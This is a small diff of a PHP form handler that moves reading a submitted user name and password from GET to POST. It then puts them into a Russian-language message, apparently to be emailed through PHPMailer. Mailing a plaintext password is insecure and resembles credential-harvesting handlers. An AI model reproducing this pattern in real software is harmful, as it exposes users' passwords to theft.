@@ -1,7 +1,7 @@
 <?php 
-$name=$_GET['user_name'];
-$pass=$_GET['user_password'];
-$form = $_GET['form'];
+$name=$_POST['user_name'];
+$pass=$_POST['user_password'];
+$form = $_POST['form'];
 $message = 'Имя клиента: '.htmlspecialchars($name).'<br>Это пароль: '.htmlspecialchars($pass);
 require_once('phpmailer/PHPMailerAutoload.php');
 $mail = new PHPMailer;
